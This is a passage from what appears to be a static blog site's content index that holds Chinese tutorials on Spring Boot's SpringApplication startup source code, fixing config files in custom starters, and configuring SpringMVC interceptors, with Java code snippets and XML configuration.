//上述完成了环境的创建和配置，传入的参数和资源加载到environment\n\n   //绑定环境到SpringApplication\n   bindToSpringApplication(environment);\n   if (!this.isCustomEnvironment) {\n      environment = new EnvironmentConverter(getClassLoader())\n            .convertEnvironmentIfNecessary(environment, deduceEnvironmentClass());\n   }\n   ConfigurationPropertySources.attach(environment);\n   return environment;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n这段代码核心有3个。\n\n 1. configureEnvironment，用于基本运行环境的配置。\n 2. 发布事件ApplicationEnvironmentPreparedEvent。和发布ApplicationStartingEvent事件的流程一样。\n 3. 绑定环境到SpringApplication\n\n\n# 3.4 创建ApplicationContext\n\ncontext = createApplicationContext();\n\n\n1\n\n\n传说中的IOC容器终于来了。\n\n在实例化context之前，首先需要确定context的类型，这个是根据应用类型确定的。应用类型webApplicationType在构造器已经推断出来了。\n\nprotected ConfigurableApplicationContext createApplicationContext() {\n   Class<?> contextClass = this.applicationContextClass;\n   if (contextClass == null) {\n      try {\n         switch (this.webApplicationType) {\n         case SERVLET:\n            //应用为servlet类型的web应用\n            contextClass = Class.forName(DEFAULT_SERVLET_WEB_CONTEXT_CLASS);\n            break;\n         case REACTIVE:\n            //应用为响应式web应用\n            contextClass = Class.forName(DEFAULT_REACTIVE_WEB_CONTEXT_CLASS);\n            break;\n         default:\n            //应用为非web类型的应用\n            contextClass = Class.forName(DEFAULT_CONTEXT_CLASS);\n         }\n      }\n      catch (ClassNotFoundException ex) {\n         throw new IllegalStateException(\n               "Unable create a default ApplicationContext, "\n                     + "please specify an ApplicationContextClass",\n               ex);\n      }\n   }\n   return (ConfigurableApplicationContext) BeanUtils.instantiateClass(contextClass);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n获取context类型后，进行实例化，这里根据class类型获取无参构造器进行实例化。\n\npublic static <T> T instantiateClass(Class<T> clazz) throws BeanInstantiationException {\n   Assert.notNull(clazz, "Class must not be null");\n   if (clazz.isInterface()) {\n      throw new BeanInstantiationException(clazz, "Specified class is an interface");\n   }\n   try {\n       //clazz.getDeclaredConstructor()获取无参的构造器，然后进行实例化\n      return instantiateClass(clazz.getDeclaredConstructor());\n   }\n   catch (NoSuchMethodException ex) {\n    .......\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n比如web类型为servlet类型，就会实例化org.springframework.boot.web.servlet.context.\n\nAnnotationConfigServletWebServerApplicationContext类型的context。\n\n\n# 3.5 context前置处理阶段\n\nprivate void prepareContext(ConfigurableApplicationContext context,\n      ConfigurableEnvironment environment, SpringApplicationRunListeners listeners,\n      ApplicationArguments applicationArguments, Banner printedBanner) {\n   //关联环境\n   context.setEnvironment(environment);\n\n   //ApplicationContext预处理，主要配置Bean生成器以及资源加载器\n   postProcessApplicationContext(context);\n    \n   //调用初始化器，执行initialize方法，前面set的初始化器终于用上了\n   applyInitializers(context);\n   //发布contextPrepared事件，和发布starting事件一样，不多说\n   listeners.contextPrepared(context);\n   if (this.logStartupInfo) {\n      logStartupInfo(context.getParent() == null);\n      logStartupProfileInfo(context);\n   }\n\n   // Add boot specific singleton beans\n   ConfigurableListableBeanFactory beanFactory = context.getBeanFactory();\n   //bean, springApplicationArguments,用于获取启动application所需的参数\n   beanFactory.registerSingleton("springApplicationArguments", applicationArguments);\n    \n   //加载打印Banner的Bean\n   if (printedBanner != null) {\n      beanFactory.registerSingleton("springBootBanner", printedBanner);\n   }\n   \n   if (beanFactory instanceof DefaultListableBeanFactory) {\n      ((DefaultListableBeanFactory) beanFactory)\n            .setAllowBeanDefinitionOverriding(this.allowBeanDefinitionOverriding);\n   }\n   // Load the sources，根据primarySources加载resource。primarySources:一般为主类的class对象\n   Set<Object> sources = getAllSources();\n   Assert.notEmpty(sources, "Sources must not be empty");\n   //构造BeanDefinitionLoader并完成定义的Bean的加载\n   load(context, sources.toArray(new Object[0]));\n   //发布ApplicationPreparedEvent事件，表示application已准备完成\n   listeners.contextLoaded(context);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# 3.6 刷新容器\n\nprivate void refreshContext(ConfigurableApplicationContext context) {\n   refresh(context);\n   // 注册一个关闭容器时的钩子函数,在jvm关闭时调用\n   if (this.registerShutdownHook) {\n      try {\n         context.registerShutdownHook();\n      }\n      catch (AccessControlException ex) {\n         // Not allowed in some environments.\n      }\n   }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n调用父类AbstractApplicationContext刷新容器的操作，具体的还没看。\n\n@Override\npublic void refresh() throws BeansException, IllegalStateException {\n   synchronized (this.startupShutdownMonitor) {\n      // Prepare this context for refreshing.\n      prepareRefresh();\n\n      // Tell the subclass to refresh the internal bean factory.\n      ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();\n\n      // Prepare the bean factory for use in this context.\n      prepareBeanFactory(beanFactory);\n\n      try {\n         // Allows post-processing of the bean factory in context subclasses.\n         postProcessBeanFactory(beanFactory);\n\n         // Invoke factory processors registered as beans in the context.\n         invokeBeanFactoryPostProcessors(beanFactory);\n\n         // Register bean processors that intercept bean creation.\n         registerBeanPostProcessors(beanFactory);\n\n         // Initialize message source for this context.\n         initMessageSource();\n\n         // Initialize event multicaster for this context.\n         initApplicationEventMulticaster();\n\n         // Initialize other special beans in specific context subclasses.\n         onRefresh();\n\n         // Check for listener beans and register them.\n         registerListeners();\n\n         // Instantiate all remaining (non-lazy-init) singletons.\n         finishBeanFactoryInitialization(beanFactory);\n\n         // Last step: publish corresponding event.\n         finishRefresh();\n      }\n       ......\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# 3.7 后置操作，调用Runners\n\n后置操作，就是在容器完成刷新后，依次调用注册的Runners，还可以通过@Order注解设置各runner的执行顺序。\n\nRunner可以通过实现ApplicationRunner或者CommandLineRunner接口。\n\nprivate void callRunners(ApplicationContext context, ApplicationArguments args) {\n        List<Object> runners = new ArrayList<>();\n        runners.addAll(context.getBeansOfType(ApplicationRunner.class).values());\n        runners.addAll(context.getBeansOfType(CommandLineRunner.class).values());\n        AnnotationAwareOrderComparator.sort(runners);\n        for (Object runner : new LinkedHashSet<>(runners)) {\n            if (runner instanceof ApplicationRunner) {\n                callRunner((ApplicationRunner) runner, args);\n            }\n            if (runner instanceof CommandLineRunner) {\n                callRunner((CommandLineRunner) runner, args);\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n根据源码可知，runners收集从容器获取的ApplicationRunner和CommandLineRunner类型的Bean，然后依次执行。\n\n\n# 3.8 发布ApplicationReadyEvent事件\n\nlisteners.running(context);\n\n\n1\n\n\n应用启动完成，可以对外提供服务了，在这里发布ApplicationReadyEvent事件。流程还是和starting时一样。',normalizedContent:'# 1.进入springapplication\n\npublic static configurableapplicationcontext run(class<?>[] primarysources,\n      string[] args) {\n   return new springapplication(primarysources).run(args);\n}\n\n\n1\n2\n3\n4\n\n\n我们根据demoapplication跟进代码，发现其调用的springapplication类的run方法。这个方法就干了2件事：一是创建springapplication对象，二是启动springapplication。\n\n\n# 2.springapplication构造器分析\n\npublic springapplication(class<?>... primarysources) {\n    this(null, primarysources);\n}\n/**\n* create a new {@link springapplication} instance. the application context will load\n* beans from the specified primary sources\n*/\npublic springapplication(resourceloader resourceloader, class<?>... primarysources) {\n   this.resourceloader = resourceloader;\n   assert.notnull(primarysources, "primarysources must not be null");\n   this.primarysources = new linkedhashset<>(arrays.aslist(primarysources));\n  //根据应用是否存在某些类推断应用类型，分为响应式web应用，servlet类型web应用和非web应用，在后面用于确定实例化applicationcontext的类型\n   this.webapplicationtype = webapplicationtype.deducefromclasspath();\n   //设置初始化器，读取spring.factories文件key applicationcontextinitializer对应的value并实例化\n   //applicationcontextinitializer接口用于在spring上下文被刷新之前进行初始化的操作\n   setinitializers((collection) getspringfactoriesinstances(\n         applicationcontextinitializer.class));\n\n   //设置监听器，读取spring.factories文件key applicationlistener对应的value并实例化\n   // interface applicationlistener<e extends applicationevent> extends eventlistener\n   //applicationlistener继承eventlistener，实现了观察者模式。对于spring框架的观察者模式实现，它限定感兴趣的事件类型需要是applicationevent类型事件\n\n   setlisteners((collection) getspringfactoriesinstances(applicationlistener.class));\n   //没啥特别作用，仅用于获取入口类class对象\n   this.mainapplicationclass = deducemainapplicationclass();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n在构造器里主要干了2件事，一个设置初始化器，二是设置监听器。\n\n\n# 2.1 设置初始化器\n\nsetinitializers((collection) getspringfactoriesinstances(\n      applicationcontextinitializer.class));\nprivate <t> collection<t> getspringfactoriesinstances(class<t> type) {\n   return getspringfactoriesinstances(type, new class<?>[] {});\n}\n\nprivate <t> collection<t> getspringfactoriesinstances(class<t> type,\n      class<?>[] parametertypes, object... args) {\n   classloader classloader = getclassloader();\n   // use names and ensure unique to protect against duplicates\n   set<string> names = new linkedhashset<>(\n    //从类路径的meta-inf处读取相应配置文件spring.factories，然后进行遍历，读取配置文件中key(type)对应的value\n         springfactoriesloader.loadfactorynames(type, classloader));\n   //将names的对象实例化\n   list<t> instances = createspringfactoriesinstances(type, parametertypes,\n         classloader, args, names);\n   annotationawareordercomparator.sort(instances);\n   return instances;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n根据入参type类型applicationcontextinitializer.class从类路径的meta-inf处读取相应配置文件spring.factories并实例化对应initializer。上面这2个函数后面会反复用到。\n\norg.springframework.context.applicationcontextinitializer=\\\norg.springframework.boot.context.configurationwarningsapplicationcontextinitializer,\\\norg.springframework.boot.context.contextidapplicationcontextinitializer,\\\norg.springframework.boot.context.config.delegatingapplicationcontextinitializer,\\\norg.springframework.boot.web.context.serverportinfoapplicationcontextinitializer\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.2.设置监听器\n\nsetlisteners((collection) getspringfactoriesinstances(applicationlistener.class));\n\n\n1\n\n\n和设置初始化器一个套路，通过getspringfactoriesinstances函数实例化监听器。\n\norg.springframework.context.applicationlistener=\\\norg.springframework.boot.clearcachesapplicationlistener,\\\norg.springframework.boot.builder.parentcontextcloserapplicationlistener,\\\norg.springframework.boot.context.fileencodingapplicationlistener,\\\norg.springframework.boot.context.config.ansioutputapplicationlistener,\\\norg.springframework.boot.context.config.configfileapplicationlistener,\\\norg.springframework.boot.context.config.delegatingapplicationlistener,\\\norg.springframework.boot.context.logging.classpathloggingapplicationlistener,\\\norg.springframework.boot.context.logging.loggingapplicationlistener,\\\norg.springframework.boot.liquibase.liquibaseservicelocatorapplicationlistener\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 3. run(string... args)解析\n\n/**\n* run the spring application, creating and refreshing a new applicationcontext\n*/\n\npublic configurableapplicationcontext run(string... args) {\n   //计时器\n   stopwatch stopwatch = new stopwatch();\n   stopwatch.start();\n\n   configurableapplicationcontext context = null;\n   collection<springbootexceptionreporter> exceptionreporters = new arraylist<>();\n\n   //设置java.awt.headless系统属性为true，headless模式是系统的一种配置模式。\n   // 在该模式下，系统缺少了显示设备、键盘或鼠标。但是服务器生成的数据需要提供给显示设备等使用。\n   // 因此使用headless模式，一般是在程序开始激活headless模式，告诉程序，现在你要工作在headless        mode下，依靠系统的计算能力模拟出这些特性来\n   configureheadlessproperty();\n\n   //获取监听器集合对象\n   springapplicationrunlisteners listeners = getrunlisteners(args);\n\n   //发出开始执行的事件。\n   listeners.starting();\n\n   try {\n      //根据main函数传入的参数，创建defaultapplicationarguments对象\n      applicationarguments applicationarguments = new defaultapplicationarguments(\n            args);\n      //根据扫描到的监听器对象和函数传入参数，进行环境准备。\n      configurableenvironment environment = prepareenvironment(listeners,\n            applicationarguments);\n\n      configureignorebeaninfo(environment);\n      banner printedbanner = printbanner(environment);\n\n      context = createapplicationcontext();\n\n      //和上面套路一样，读取spring.factories文件key springbootexceptionreporter对应的value\n      exceptionreporters = getspringfactoriesinstances(\n            springbootexceptionreporter.class,\n            new class[] { configurableapplicationcontext.class }, context);\n\n      preparecontext(context, environment, listeners, applicationarguments,\n            printedbanner);\n\n      //和上面的一样，context准备完成之后，将触发springapplicationrunlistener的contextprepared执行\n      refreshcontext(context);\n\n      //其实啥也没干。但是老版本的callrunners好像是在这里执行的。\n      afterrefresh(context, applicationarguments);\n\n      stopwatch.stop();\n      if (this.logstartupinfo) {\n         new startupinfologger(this.mainapplicationclass)\n               .logstarted(getapplicationlog(), stopwatch);\n      }\n      //发布applicationstartedevent事件，发出结束执行的事件\n      listeners.started(context);\n      //在某些情况下，我们希望在容器bean加载完成后执行一些操作，会实现applicationrunner或者commandlinerunner接口\n      //后置操作，就是在容器完成刷新后，依次调用注册的runners，还可以通过@order注解设置各runner的执行顺序。\n      callrunners(context, applicationarguments);\n   }\n   catch (throwable ex) {\n      handlerunfailure(context, ex, exceptionreporters, listeners);\n      throw new illegalstateexception(ex);\n   }\n\n   try {\n      listeners.running(context);\n   }\n   catch (throwable ex) {\n      handlerunfailure(context, ex, exceptionreporters, null);\n      throw new illegalstateexception(ex);\n   }\n   return context;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n\n\n\n# 3.1 获取run listeners\n\nspringapplicationrunlisteners listeners = getrunlisteners(args);\n\n\n1\n\n\n和构造器设置初始化器一个套路，根据传入type springapplicationrunlistener去扫描spring.factories文件，读取type对应的value并实例化。然后利用实例化对象创建springapplicationrunlisteners对象。\n\norg.springframework.boot.springapplicationrunlistener=\\\norg.springframework.boot.context.event.eventpublishingrunlistener\n\n\n1\n2\n\n\neventpublishingrunlistener的作用是发布springapplicationevent事件。\n\neventpublishingrunlistener更像是被监听对象，这个命名让我有点迷。\n\npublic class eventpublishingrunlistener implements springapplicationrunlistener, ordered {\n    ......\n   @override\n   public void starting() {\n      this.initialmulticaster.multicastevent(\n            new applicationstartingevent(this.application, this.args));\n   }\n\n   @override\n   public void environmentprepared(configurableenvironment environment) {\n      this.initialmulticaster.multicastevent(new applicationenvironmentpreparedevent(\n            this.application, this.args, environment));\n   }\n    ........\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 3.2 发出开始执行的事件\n\nlisteners.starting();\n\n\n1\n\n\n继续跟进starting函数，\n\npublic void starting() {\n   this.initialmulticaster.multicastevent(\n         new applicationstartingevent(this.application, this.args));\n}\n//获取applicationstartingevent类型的事件后，发布事件\n    @override\n    public void multicastevent(final applicationevent event, @nullable resolvabletype eventtype) {\n        resolvabletype type = (eventtype != null ? eventtype : resolvedefaulteventtype(event));\n        for (final applicationlistener<?> listener : getapplicationlisteners(event, type)) {\n            executor executor = gettaskexecutor();\n            if (executor != null) {\n                executor.execute(() -> invokelistener(listener, event));\n            }\n            else {\n                invokelistener(listener, event);\n            }\n        }\n    }\n//继续跟进invokelistener方法,最后调用applicationlistener监听者的onapplicationevent处理事件\n    private void doinvokelistener(applicationlistener listener, applicationevent event) {\n        try {\n            listener.onapplicationevent(event);\n        }\n        catch (classcastexception ex) {\n            .....\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n这个后面也会反复遇到，比如listeners.running(context)。\n\n这里是典型的观察者模式。\n\n//观察者：监听<e extends applicationevent>类型事件\napplicationlistener<e extends applicationevent> extends eventlistener\n\n//事件类型：\nevent extends springapplicationevent  extends applicationevent extends eventobject\n\n//被观察者：发布事件\neventpublishingrunlistener implements springapplicationrunlistener\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nspringapplication根据当前事件event类型，比如applicationstartingevent，查找到监听applicationstartingevent的观察者eventpublishingrunlistener，调用观察者的onapplicationevent处理事件。\n\n\n# 3.3 环境准备\n\n//根据main函数传入的参数，创建defaultapplicationarguments对象\napplicationarguments applicationarguments = new defaultapplicationarguments(\n      args);\n//根据扫描到的listeners对象和函数传入参数，进行环境准备。\nconfigurableenvironment environment = prepareenvironment(listeners,\n      applicationarguments);\n\n\n1\n2\n3\n4\n5\n6\n\n\napplicationarguments提供运行application的参数，后面会作为一个bean注入到容器。这里重点说下prepareenvironment方法做了些什么。\n\nprivate configurableenvironment prepareenvironment(\n      springapplicationrunlisteners listeners,\n      applicationarguments applicationarguments) {\n\n   // create and configure the environment\n   configurableenvironment environment = getorcreateenvironment();\n\n   configureenvironment(environment, applicationarguments.getsourceargs());\n\n    //和listeners.starting一样的流程\n   listeners.environmentprepared(environment);\n\n   //上述完成了环境的创建和配置，传入的参数和资源加载到environment\n\n   //绑定环境到springapplication\n   bindtospringapplication(environment);\n   if (!this.iscustomenvironment) {\n      environment = new environmentconverter(getclassloader())\n            .convertenvironmentifnecessary(environment, deduceenvironmentclass());\n   }\n   configurationpropertysources.attach(environment);\n   return environment;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n这段代码核心有3个。\n\n 1. configureenvironment，用于基本运行环境的配置。\n 2. 发布事件applicationenvironmentpreparedevent。和发布applicationstartingevent事件的流程一样。\n 3. 绑定环境到springapplication\n\n\n# 3.4 创建applicationcontext\n\ncontext = createapplicationcontext();\n\n\n1\n\n\n传说中的ioc容器终于来了。\n\n在实例化context之前，首先需要确定context的类型，这个是根据应用类型确定的。应用类型webapplicationtype在构造器已经推断出来了。\n\nprotected configurableapplicationcontext createapplicationcontext() {\n   class<?> contextclass = this.applicationcontextclass;\n   if (contextclass == null) {\n      try {\n         switch (this.webapplicationtype) {\n         case servlet:\n            //应用为servlet类型的web应用\n            contextclass = class.forname(default_servlet_web_context_class);\n            break;\n         case reactive:\n            //应用为响应式web应用\n            contextclass = class.forname(default_reactive_web_context_class);\n            break;\n         default:\n            //应用为非web类型的应用\n            contextclass = class.forname(default_context_class);\n         }\n      }\n      catch (classnotfoundexception ex) {\n         throw new illegalstateexception(\n               "unable create a default applicationcontext, "\n                     + "please specify an applicationcontextclass",\n               ex);\n      }\n   }\n   return (configurableapplicationcontext) beanutils.instantiateclass(contextclass);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n获取context类型后，进行实例化，这里根据class类型获取无参构造器进行实例化。\n\npublic static <t> t instantiateclass(class<t> clazz) throws beaninstantiationexception {\n   assert.notnull(clazz, "class must not be null");\n   if (clazz.isinterface()) {\n      throw new beaninstantiationexception(clazz, "specified class is an interface");\n   }\n   try {\n       //clazz.getdeclaredconstructor()获取无参的构造器，然后进行实例化\n      return instantiateclass(clazz.getdeclaredconstructor());\n   }\n   catch (nosuchmethodexception ex) {\n    .......\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n比如web类型为servlet类型，就会实例化org.springframework.boot.web.servlet.context.\n\nannotationconfigservletwebserverapplicationcontext类型的context。\n\n\n# 3.5 context前置处理阶段\n\nprivate void preparecontext(configurableapplicationcontext context,\n      configurableenvironment environment, springapplicationrunlisteners listeners,\n      applicationarguments applicationarguments, banner printedbanner) {\n   //关联环境\n   context.setenvironment(environment);\n\n   //applicationcontext预处理，主要配置bean生成器以及资源加载器\n   postprocessapplicationcontext(context);\n    \n   //调用初始化器，执行initialize方法，前面set的初始化器终于用上了\n   applyinitializers(context);\n   //发布contextprepared事件，和发布starting事件一样，不多说\n   listeners.contextprepared(context);\n   if (this.logstartupinfo) {\n      logstartupinfo(context.getparent() == null);\n      logstartupprofileinfo(context);\n   }\n\n   // add boot specific singleton beans\n   configurablelistablebeanfactory beanfactory = context.getbeanfactory();\n   //bean, springapplicationarguments,用于获取启动application所需的参数\n   beanfactory.registersingleton("springapplicationarguments", applicationarguments);\n    \n   //加载打印banner的bean\n   if (printedbanner != null) {\n      beanfactory.registersingleton("springbootbanner", printedbanner);\n   }\n   \n   if (beanfactory instanceof defaultlistablebeanfactory) {\n      ((defaultlistablebeanfactory) beanfactory)\n            .setallowbeandefinitionoverriding(this.allowbeandefinitionoverriding);\n   }\n   // load the sources，根据primarysources加载resource。primarysources:一般为主类的class对象\n   set<object> sources = getallsources();\n   assert.notempty(sources, "sources must not be empty");\n   //构造beandefinitionloader并完成定义的bean的加载\n   load(context, sources.toarray(new object[0]));\n   //发布applicationpreparedevent事件，表示application已准备完成\n   listeners.contextloaded(context);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# 3.6 刷新容器\n\nprivate void refreshcontext(configurableapplicationcontext context) {\n   refresh(context);\n   // 注册一个关闭容器时的钩子函数,在jvm关闭时调用\n   if (this.registershutdownhook) {\n      try {\n         context.registershutdownhook();\n      }\n      catch (accesscontrolexception ex) {\n         // not allowed in some environments.\n      }\n   }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n调用父类abstractapplicationcontext刷新容器的操作，具体的还没看。\n\n@override\npublic void refresh() throws beansexception, illegalstateexception {\n   synchronized (this.startupshutdownmonitor) {\n      // prepare this context for refreshing.\n      preparerefresh();\n\n      // tell the subclass to refresh the internal bean factory.\n      configurablelistablebeanfactory beanfactory = obtainfreshbeanfactory();\n\n      // prepare the bean factory for use in this context.\n      preparebeanfactory(beanfactory);\n\n      try {\n         // allows post-processing of the bean factory in context subclasses.\n         postprocessbeanfactory(beanfactory);\n\n         // invoke factory processors registered as beans in the context.\n         invokebeanfactorypostprocessors(beanfactory);\n\n         // register bean processors that intercept bean creation.\n         registerbeanpostprocessors(beanfactory);\n\n         // initialize message source for this context.\n         initmessagesource();\n\n         // initialize event multicaster for this context.\n         initapplicationeventmulticaster();\n\n         // initialize other special beans in specific context subclasses.\n         onrefresh();\n\n         // check for listener beans and register them.\n         registerlisteners();\n\n         // instantiate all remaining (non-lazy-init) singletons.\n         finishbeanfactoryinitialization(beanfactory);\n\n         // last step: publish corresponding event.\n         finishrefresh();\n      }\n       ......\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# 3.7 后置操作，调用runners\n\n后置操作，就是在容器完成刷新后，依次调用注册的runners，还可以通过@order注解设置各runner的执行顺序。\n\nrunner可以通过实现applicationrunner或者commandlinerunner接口。\n\nprivate void callrunners(applicationcontext context, applicationarguments args) {\n        list<object> runners = new arraylist<>();\n        runners.addall(context.getbeansoftype(applicationrunner.class).values());\n        runners.addall(context.getbeansoftype(commandlinerunner.class).values());\n        annotationawareordercomparator.sort(runners);\n        for (object runner : new linkedhashset<>(runners)) {\n            if (runner instanceof applicationrunner) {\n                callrunner((applicationrunner) runner, args);\n            }\n            if (runner instanceof commandlinerunner) {\n                callrunner((commandlinerunner) runner, args);\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n根据源码可知，runners收集从容器获取的applicationrunner和commandlinerunner类型的bean，然后依次执行。\n\n\n# 3.8 发布applicationreadyevent事件\n\nlisteners.running(context);\n\n\n1\n\n\n应用启动完成，可以对外提供服务了，在这里发布applicationreadyevent事件。流程还是和starting时一样。',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"springboot自定义starter时，starter内的配置文件不生效问题",frontmatter:{title:"springboot自定义starter时，starter内的配置文件不生效问题",date:"2022-04-17T23:27:53.000Z",permalink:"/pages/63890e/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/09.springboot%E8%87%AA%E5%AE%9A%E4%B9%89starter%E6%97%B6%EF%BC%8Cstarter%E5%86%85%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%8D%E7%94%9F%E6%95%88%E9%97%AE%E9%A2%98.html",relativePath:"04.java/04.spring/09.springboot自定义starter时，starter内的配置文件不生效问题.md",key:"v-46999f3c",path:"/pages/63890e/",headersStr:null,content:"原因：自定义starter时，resources根目录下的配置文件不会被打包到jar包里面\n\n解决方法：放到config文件夹下\n\n",normalizedContent:"原因：自定义starter时，resources根目录下的配置文件不会被打包到jar包里面\n\n解决方法：放到config文件夹下\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"springmvc _ 配置拦截器 interceptor",frontmatter:{title:"springmvc _ 配置拦截器 interceptor",date:"2022-04-17T23:27:53.000Z",permalink:"/pages/441d52/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/10.springmvc%20_%20%E9%85%8D%E7%BD%AE%E6%8B%A6%E6%88%AA%E5%99%A8%20interceptor.html",relativePath:"04.java/04.spring/10.springmvc _ 配置拦截器 interceptor.md",key:"v-51100657",path:"/pages/441d52/",headers:[{level:2,title:"什么是拦截器",slug:"什么是拦截器",normalizedTitle:"什么是拦截器",charIndex:2},{level:2,title:"配置自定义拦截器",slug:"配置自定义拦截器",normalizedTitle:"配置自定义拦截器",charIndex:275},{level:2,title:"多个拦截器",slug:"多个拦截器",normalizedTitle:"多个拦截器",charIndex:1748}],headersStr:"什么是拦截器 配置自定义拦截器 多个拦截器",content:'# 什么是拦截器\n\n拦截器（Interceptor）：是SpringMVC、Struts等表现层框架自己的，不会拦截jsp/html/css/image的访问等，只会拦截访问的控制器方法（Handler）。底层采用的是aop的思想\n\n * 从配置的角度也能够总结发现：serlvet、filter、listener是配置在web.xml中的，而interceptor是配置在表现层框架自己的配置文件中的\n * 在Handler业务逻辑执行之前拦截一次\n * 在Handler逻辑执行完毕但未跳转页面之前拦截一次\n * 在跳转页面之后拦截一次\n\n\n# 配置自定义拦截器\n\n * 实现接口HandlerInterceptor\n * 重写方法：\n   * preHandle：handler之前执行，返回true表示放行(只要访问到该拦截器，一定执行)\n   * postHandle：handler逻辑真正执行完成但尚未返回页面（如果页面放行才会执行）\n   * afterCompletion：返回页面之后（只要访问到该拦截器，一定执行）\n\npublic class MyInterceptor implements HandlerInterceptor {\n\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        System.out.println("拦截器1：preHandle");\n        return true;\n    }\n\n    @Override\n    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {\n        System.out.println("拦截器1：postHandle");\n    }\n\n    @Override\n    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {\n        System.out.println("拦截器1：afterCompletion");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n * springmvc.xml配置拦截器\n\n<mvc:interceptors>\n    <mvc:interceptor>\n        \x3c!--/** 拦截浏览器的所有请求--\x3e\n        <mvc:mapping path="/**"/>\n        \x3c!--可以 配置指定的资源进行不拦截, 资源放行--\x3e\n        <mvc:exclude-mapping path="/js/**"></mvc:exclude-mapping>\n        <mvc:exclude-mapping path="/css/**"></mvc:exclude-mapping>\n        <mvc:exclude-mapping path="/image/**"></mvc:exclude-mapping>\n\n        <bean id="myInterceptor " class="com.kehao.interceptor.MyInterceptor "></bean>\n    </mvc:interceptor>\n</mvc:interceptors>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 多个拦截器\n\n如果有多个拦截器\n\n * preHandle方法需要根据springmvc.xml中的配置顺序依次执行\n * afterCompletion则相反，越早执行preHandle方法的拦截器，越晚执行afterCompletion,类似于栈',normalizedContent:'# 什么是拦截器\n\n拦截器（interceptor）：是springmvc、struts等表现层框架自己的，不会拦截jsp/html/css/image的访问等，只会拦截访问的控制器方法（handler）。底层采用的是aop的思想\n\n * 从配置的角度也能够总结发现：serlvet、filter、listener是配置在web.xml中的，而interceptor是配置在表现层框架自己的配置文件中的\n * 在handler业务逻辑执行之前拦截一次\n * 在handler逻辑执行完毕但未跳转页面之前拦截一次\n * 在跳转页面之后拦截一次\n\n\n# 